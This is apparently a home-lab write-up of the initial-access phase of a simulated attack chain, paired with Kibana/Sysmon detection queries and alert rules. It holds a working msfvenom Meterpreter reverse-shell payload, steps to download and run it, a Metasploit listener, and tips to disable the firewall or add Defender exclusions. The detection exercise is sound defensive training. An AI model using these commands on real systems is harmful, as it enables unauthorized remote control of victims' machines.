# Phase 2: Initial Access – Reverse Shell on WS1

## 1. Objective

Gain a foothold on WS1 (`192.168.1.20`) by executing a reverse shell payload. The payload is generated using `msfvenom`, transferred to the target system, and executed to establish a Meterpreter session via a Metasploit listener on Kali (`192.168.1.5`).

### MITRE ATT&CK Mapping

- **Tactic:** TA0001 – Initial Access  
- **Technique:** T1203 – Exploitation for Client Execution  

---

## 2. Attack Execution

All actions were performed from the Kali attacker VM (`192.168.1.5`) targeting WS1 (`192.168.1.20`).

---

### 2.1 Payload Generation (msfvenom)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o /tmp/shell.exe
```

### Parameter Explanation
- `-p windows/meterpreter/reverse_tcp` → Meterpreter reverse TCP payload  
- `LHOST=192.168.1.5` → Attacker IP (Kali)  
- `LPORT=4444` → Listening port  
- `-f exe` → Windows executable format  
- `-o /tmp/shell.exe` → Output file  

---

### 2.2 Payload Transfer to WS1

#### Method A – Shared Folder
```cmd
copy "\\vmware-host\Shared Folders\share\shell.exe" C:\Users\Public\
```

#### Method B – HTTP Server

On Kali:
```bash
cd /tmp
python3 -m http.server 8080
```

On WS1 (PowerShell as Admin):
```powershell
Invoke-WebRequest -Uri "http://192.168.1.5:8080/shell.exe" -OutFile "C:\Users\Public\shell.exe"
```

---

### 2.3 Metasploit Listener Setup

```bash
sudo msfconsole -q
```

Inside msfconsole:

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
exploit -j
```

---

### 2.4 Payload Execution on WS1

```cmd
C:\Users\Public\shell.exe
```

---

### 2.5 Successful Session Output

```text
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Sending stage (200000 bytes) to 192.168.1.20
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.20:49234)
```

Interact with session:
```text
sessions -i 1
meterpreter >
```

---

## 3. Detection in Kibana

All activity was logged via Winlogbeat and Sysmon into `winlogbeat-*` index.

---

### 3.1 Event ID 4688 – Process Creation

```text
winlog.event_id: 4688 AND process.executable: *shell.exe
```

#### Example Fields
| Field | Value |
|------|------|
| Event ID | 4688 |
| Process | shell.exe |
| User | normaluser |
| Host | WS1 |

---

### 3.2 Sysmon Event ID 1 – Process Creation

```text
event.code: 1 AND process.executable: *shell.exe
```

---

### 3.3 Sysmon Event ID 3 – Network Connection

```text
event.code: 3 AND source.ip: 192.168.1.20 AND destination.ip: 192.168.1.5 AND destination.port: 4444
```

---

## 4. Detection Rules (Kibana Alerting)

### Rule 1 – Reverse Shell Execution

- **Name:** Detect Reverse Shell – shell.exe  
- **Index:** winlogbeat-*  
- **Query:**
```text
winlog.event_id: 4688 AND process.executable: *shell.exe
```
- **Schedule:** Every 5 minutes  
- **Threshold:** > 0  

---

### Rule 2 – Suspicious Outbound Connection

- **Name:** Reverse Shell Network Activity  
- **Index:** winlogbeat-*  
- **Query:**
```text
event.code: 3 AND destination.port: 4444 AND source.ip: 192.168.1.20
```

---

## 5. Screenshot Checklist

Capture the following:

- Kali: `msfvenom` + `msfconsole` session open  
- WS1: execution of `shell.exe`  
- Kibana: Event ID 4688 showing process execution  
- (Optional) Sysmon Event ID 3 network connection  

---

## 6. Troubleshooting

| Issue | Cause | Fix |
|------|------|-----|
| No session | Firewall blocking | Disable firewall temporarily |
| Payload blocked | Windows Defender | Add exclusion path |
| No connection | Wrong LHOST | Verify attacker IP |
| Execution fails | Corrupt payload | Regenerate msfvenom file |

---

## 7. Conclusion

The initial access phase successfully established a Meterpreter session on WS1. All activity was detected via Winlogbeat (Event ID 4688) and Sysmon (Event IDs 1 and 3), confirming full visibility of early-stage attacker behavior within Kibana.

This completes Phase 2 of the Nation-State Lab attack chain.